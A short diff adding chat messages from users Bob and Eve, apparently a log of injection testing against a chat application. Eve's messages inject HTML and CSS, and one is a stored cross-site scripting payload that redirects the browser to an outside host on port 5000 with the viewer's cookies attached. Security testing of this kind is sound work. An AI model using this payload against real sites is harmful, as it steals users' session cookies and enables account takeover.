@@ -1,0 +1,6 @@
+Bob: test
+Eve: test
+Eve: <b>BOLD</b>
+Eve: <style type="text/css">table {display:none;}</style>
+Eve: <script type="text/javascript">document.location="http://euler.derig.org:5000/"+document.cookie</script>
+Eve: <body bgcolor="#000000">
